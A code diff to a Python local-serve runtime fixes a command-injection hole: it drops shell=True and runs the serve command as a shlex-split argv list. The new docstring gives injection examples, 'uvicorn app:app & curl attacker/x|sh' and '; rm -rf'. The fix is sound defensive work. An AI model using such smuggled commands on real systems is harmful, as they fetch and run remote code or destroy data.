@@ -19,6 +19,7 @@ wired up yet (tracked as a follow-up; see the Evaluator call site).
 from __future__ import annotations
 
 import os
+import shlex
 import signal
 import subprocess
 import time
@@ -75,15 +76,33 @@ class LocalServeRuntime:
     # ── start / stop ──────────────────────────────────────────────────────
 
     def start(self) -> None:
-        # shell=True: serve_command is a detected/contract-declared local
-        # command (e.g. "python -m uvicorn app:app --port 8123"), not
-        # untrusted input. start_new_session=True puts it in its own process
-        # group so stop() can kill the whole tree — the command is often a
-        # shell invocation whose direct child (uvicorn) would otherwise
-        # survive killing just the shell's pid.
-        self._proc = self._popen_fn(  # noqa: S604 - detected local serve cmd, not untrusted
-            self.serve_command,
-            shell=True,
+        """Exec the serve command as an argv list — deliberately NO shell.
+
+        ``serve_command`` is NOT trusted. It may be the contract's
+        ``environment.serve_command``, which ``detect_serve_command`` returns
+        verbatim, and that value originates in a PFactory plan built from an
+        imported GitHub issue body — i.e. attacker-controllable text. This
+        process runs on the VERIFY HOST, outside any sandbox, so running it
+        through ``shell=True`` (as this did until TFactory#1290) handed a
+        remote issue author arbitrary code execution here: a serve_command of
+        ``uvicorn app:app & curl attacker/x|sh`` ran the second half.
+
+        Splitting with ``shlex`` and exec'ing the argv directly makes the
+        WHOLE shell metacharacter surface inert — ``;`` ``&`` ``|`` ``$()``
+        backticks, redirections, newlines — rather than escaping any one of
+        them: an injected ``; rm -rf`` becomes literal argv words handed to
+        the serve binary, which ignores or rejects them.
+
+        ``start_new_session=True`` still puts the process in its own group so
+        ``stop()`` reaps the whole tree (uvicorn forks workers).
+        """
+        argv = shlex.split(self.serve_command)
+        if not argv:
+            raise LocalServeRuntimeError(
+                f"serve command is empty or unparseable: {self.serve_command!r}"
+            )
+        self._proc = self._popen_fn(
+            argv,
             cwd=str(self.project_dir),
             start_new_session=True,
             stdout=subprocess.DEVNULL,
